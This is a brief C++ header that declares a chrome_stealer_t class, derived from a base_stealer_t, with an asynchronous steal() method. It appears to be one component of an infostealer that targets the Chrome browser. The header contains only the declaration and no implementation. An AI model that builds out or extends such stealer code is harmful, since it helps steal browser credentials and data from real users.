#ifndef CHROME_STEALER_H
#define CHROME_STEALER_H
#include "base_stealer.h"

class chrome_stealer_t : public base_stealer_t
{
public:
    asio::awaitable<std::unique_ptr<message_t>> steal() override;
};

#endif //CHROME_STEALER_H
